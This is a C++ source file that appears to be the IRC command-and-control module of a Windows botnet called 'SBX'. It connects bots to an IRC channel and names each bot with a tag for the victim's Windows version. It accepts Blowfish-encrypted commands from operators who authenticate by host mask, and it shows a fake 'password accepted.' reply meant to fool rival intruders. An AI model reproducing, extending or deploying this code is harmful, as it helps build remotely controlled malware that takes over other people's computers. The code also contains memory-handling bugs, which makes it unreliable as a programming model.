#include <winsock.h>
#include <wininet.h>
#include <stdio.h>
#include "../Inc/SBX.h"
#include "../Inc/CIRC.h"
#include "../Inc/Defines.h"
#include "../Inc/CStr.h"
#include "../Inc/config.h"
#include "../Inc/CHash.h"

#ifdef CHECK_CON
#pragma comment(lib, "wininet.lib")
#endif
#pragma comment(lib, "Ws2_32.lib")

CIRC::CIRC()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &wsaData);
}

CIRC::~CIRC()
{
	closesocket(sock);
	delete [] nick;
	WSACleanup();
}

bool CIRC::Connect(char *srv, int port)
{
	SOCKADDR_IN ssin;
	IN_ADDR		iaddr;
	LPHOSTENT	hostent;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family	= AF_INET;
	ssin.sin_port	= htons(port);
	iaddr.s_addr	= inet_addr(srv);
	if (iaddr.s_addr == INADDR_NONE)
		hostent = gethostbyname(srv);
	else
		hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
	if (hostent == NULL)
		return false;
	ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN)) == SOCKET_ERROR)
	{
		closesocket(sock);
		return false;
	}

	return true;
}

int CIRC::Send(char *msg, ...)
{
	va_list va;
	char buf[1024];

	va_start(va, msg);
	vsprintf(buf, msg, va);
	va_end(va);

	return send(sock, buf, strlen(buf), 0);
}

bool CIRC::Recv()
{
	xGuard;
	char buf[4096];
	char tmp[1024];
	char *str = new char[4096];

	memset(buf, 0, sizeof(buf));
	
	int err = recv(sock, buf, sizeof(buf), 0);
	if (err == 0 || err == SOCKET_ERROR)
	{
		delete str;
		closesocket(sock);
		return false;
	}

	memset(tmp, 0, sizeof(tmp));
	str = strtok(buf, "\r");
	if (str != NULL)
		strncpy(tmp, str, sizeof(tmp)-1);
	while (str != NULL)
	{
		if(tmp)
			HandleMsg(tmp);
		str = strtok(str + strlen(str) + 1, "\r");
		if (str != NULL)
			strncpy(tmp, str + 1, sizeof(tmp) - 1);
		else
			str = NULL;
	}

	delete str;

	return true;
	xUnguard("CIRC::Recv");
}

void CIRC::Privmsg(char *dest, char *msg, ...)
{
	xGuard;
	va_list va;
	char buf[2048];
	char out[2048];

	va_start(va, msg);
	vsprintf(buf, msg, va);
	va_end(va);
	Main->Crypt->BFEncrypt(buf, out);
	sprintf(buf, "\\x%s", out);
	Send("PRIVMSG %s :%s\r\n", dest, buf);
	xUnguard("CIRC::Privmsg");
}

bool CIRC::CanCon()
{
#ifdef CHECK_CON
	xGuard;
	DWORD cstat;
	return InternetGetConnectedState(&cstat, 0) != 0;
	xUnguard("CIRC::CanCon");
#else
	return true;
#endif
}

void CIRC::SetNick(int Type, int len)
{
	xGuard;
	char tmp[8];
	char hsh[16];
	int t, x;
	CHash Hash;
		
	nick = new char[len + 3];
	
	if (Type == NICK_RAND || Type == NICK_OSRAND)
	{
		srand(GetTickCount());
		for (int x = 0; x < len; x++)
		{
			if (x == 0)
				nick[x] = 97 + (rand() % 26);
			else
			{
				t = rand() % 4;
				if (t == 0)
					nick[x] = 48 + (rand() % 10);
				else if (t == 1)
					nick[x] = 65 + (rand() % 26);
				else
					nick[x] = 97 + (rand() % 26);
			}
		}
		nick[x] = '\0';
	}
	if (Type == NICK_HASH || Type == NICK_OSHASH)
	{
		Hash.Get(hsh);
		sprintf(nick, "[%s]", hsh);
	}

	if (Type == NICK_OSRAND || Type == NICK_OSHASH)
	{
		OSVERSIONINFO verinfo;
		verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
		GetVersionEx(&verinfo);

		if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0)
		{
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)			  strcpy(tmp, "[95]");
			if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)				  strcpy(tmp, "[NT]");
		}
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) strcpy(tmp, "[98]");
		else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) strcpy(tmp, "[ME]");
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion ==  0) strcpy(tmp, "[2K]");
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion ==  1) strcpy(tmp, "[XP]");
		else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion ==  2) strcpy(tmp, "[2003]");

		for (x = 0; tmp[x] != '\0'; x++)
			nick[x] = tmp[x];

		if (Type == NICK_OSHASH)
		{
			nick[x] = '\0';
			strcat(nick, hsh);
		}
	}
	xUnguard("CIRC::SetNick");
}

bool CIRC::Identify(char *srvpass)
{
	xGuard;
	int err = 1;
	
	if (srvpass[0] != '\0')
		Send("PASS %s\r\n", srvpass);

	err = Send("NICK %s\r\nUSER %s 0 0 :%s\r\n", nick, nick, nick);
	if (err == 0 || err == SOCKET_ERROR)
	{
		closesocket(sock);
		return false;
	}

	return true;
	xUnguard("CIRC::Identify");
}

void CIRC::HandleMsg(char *msg)
{
	xGuard;
	CStr *CString = new CStr(2048);
	CStr *CMsg	  = new CStr(2048);
	CStr *CTmp	  = new CStr(2048);
	CStr *SUser   = new CStr(256);
	CStr *SName	  = new CStr(256);
	CStr *SDest   = new CStr(256);
	CStr *SHost   = new CStr(256);
	char tmp1[1024];
	char tmp2[1024];
	CString->Set(msg);
	SUser->Set(msg);
	bool ismaster = false;
	bool bsilent = false;
	int x = 1;

	// Debug
	//Main->MsgBx(0, MB_ICONINFORMATION, "SBX::Debug", "IRC Msg :\n\n%s", msg);

	// Send a pong when ping is requested
	if (strcmp(CString->Gettok(1, ' '), "PING") == 0)
		Send("PONG :%s\r\n",CString->Gettok(2, ' ') + 1);

	// Send version reply
	//if (strstr(msg, "\1VERSION\1"))
		//Send("NOTICE %s :\1VERSION %s\1\r\n", CString->Gettok(3, ' '), "mIRC v6.16 Khaled Mardam-Bey");
	
	if (msg[0] != ':')
		return;
	if (strcmp(CString->Gettok(2, ' '), "372") == 0)
		return;

	// Nick checks
	if (strcmp(CString->Gettok(2, ' '), "451") == 0 ||
		strcmp(CString->Gettok(2, ' '), "433") == 0)
	{
		Main->IRC->SetNick(NICK_TYPE, NICK_LEN);
		Send("NICK %s\r\nUSER %s 0 0 :%s\r\n", nick, nick, nick);
	}

	// Join channel on connect
	if (strcmp(CString->Gettok(2, ' '), "001") == 0 ||
		strcmp(CString->Gettok(2, ' '), "005") == 0 ||
		strcmp(CString->Gettok(2, ' '), "422") == 0)
		Send("JOIN %s %s\r\n\0", channel, chanpass);

	// Rejoin channel when kicked
	if (strcmp(CString->Gettok(2, ' '), "KICK") == 0)
		if (strcmp(nick, CString->Gettok(4, ' ')) == 0)
			Send("JOIN %s %s\r\n\0", channel, chanpass);

	if (strcmp(CString->Gettok(2, ' '), "PRIVMSG") == 0)
	{
		SHost->Set(msg);
		SHost->Set(SHost->Gettok(1, ' ') + 1);
		
		// Get username
		SUser->Set(SUser->Gettok(2, ':'));
		SUser->Set(SUser->Gettok(1, '!'));

		// Check if already logged int
		if (Main->Mac->FindLogin(SUser->Str()))
		{
			ismaster = true;
			SName->Set(Main->Mac->FindLogin(SUser->Str())->Name);
		}
		else
			SName->Set("");

		CTmp->Set(CString->Gettok(4, ' ') + 1);
		if (strcmp(CTmp->Mid(1,2), "\\x") == 0)
		{
			Main->Crypt->BFDecrypt(CTmp->Mid(3,strlen(CTmp->Str()) - 2), tmp1);
			CMsg->Set(tmp1);
		}
		else
			return;
	
		// Don't reply to commands?
		bsilent = strstr(CMsg->Str(), " -s") || strstr(CMsg->Str(), " -S");

		SDest->Set(msg);
		SDest->Set(SDest->Gettok(3, ' '));

		// Is the first letter the prefix?
		strcpy(tmp1, CMsg->Str());
		if (tmp1[0] != cmdprefix)
			return;

		// Someone wants to login?
		if (strcmp(CMsg->Gettok(1, ' ') + 1, "root") == 0)
		{
			strcpy(tmp1, CMsg->Gettok(2, ' '));
			strcpy(tmp2, CMsg->Gettok(3, ' '));
			if (Main->Mac->FindUser(tmp1))
				if (SHost->WildM(Main->Mac->FindUser(tmp1)->Host, SHost->Str()) == 0)
					if (Main->Mac->AddLogin(tmp1, SUser->Str(), tmp2))
					{
						ismaster = true;
						if (!bsilent)
							Privmsg(SDest->Str(), "[MAC] You logged in successful!");
					}
					else return;
				else return;
			else return;
		}

		// Is the guy logged in?
		if (ismaster)
		{
			// No param commands

			// Logout
			if (strcmp(CMsg->Gettok(1, ' ') + 1, "logout") == 0)
			{
				if (Main->Mac->DelLogin(SName->Str(),SUser->Str()))
					if (!bsilent)
						Privmsg(SDest->Str(), "[MAC] Successful logged out...");
			}

			// exit the bot
			else if (strcmp(CMsg->Gettok(1, ' ') + 1, "die") == 0)
			{
				if(Main->Mac->ChkFunc("die", Main->Mac->FindUser(SUser->Str())))
					return;
				if (!bsilent)
					Privmsg(SDest->Str(), "[BOT] Dieing...");
				Sleep(1000);
				exit(0);
			}
		}
		else
		{
			// Fake shit to make noobs think they got access to the bot (fakes SDbot)
			if (strcmp(CMsg->Gettok(1, ' ') + 1, "login") == 0 && CMsg->Gettok(2, ' ') != NULL)
				if (!bsilent)
					Privmsg(SDest->Str(), "password accepted.");
		}
	}

	delete CString;
	delete CMsg;
	delete CTmp;
	delete SUser;
	delete SName;
	delete SDest;
	delete SHost;
	xUnguard("CIRC::HandleMsg");
}